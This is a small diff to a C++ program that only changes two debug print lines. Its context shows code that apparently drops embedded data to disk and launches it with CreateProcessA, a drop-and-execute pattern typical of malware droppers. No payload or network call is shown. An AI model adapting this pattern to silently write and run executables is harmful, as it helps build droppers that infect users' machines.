@@ -215,7 +215,7 @@ int main(int argc, char* argv[])
 		drop(size3, data3, name3);
 
 		bool result = non_exe_launch(name3);
-		std::cout << "before exe_launch 2 ";
+		std::cout << "before exe_launch 2 " << std::endl;
 		if (result == true){
 			std::cout << "before exe_launch";
 			exe_launch(name1);
@@ -450,7 +450,7 @@ void exe_launch(std::string run_exe)
 	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	// call directly
 #else
-	std::cout << "exe_launch\n";
+	std::cout << "exe_launch" << std::endl;
 	BOOL err = CreateProcessA(run_exe.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	if (!err) {
 		printf("%u\n", GetLastError());
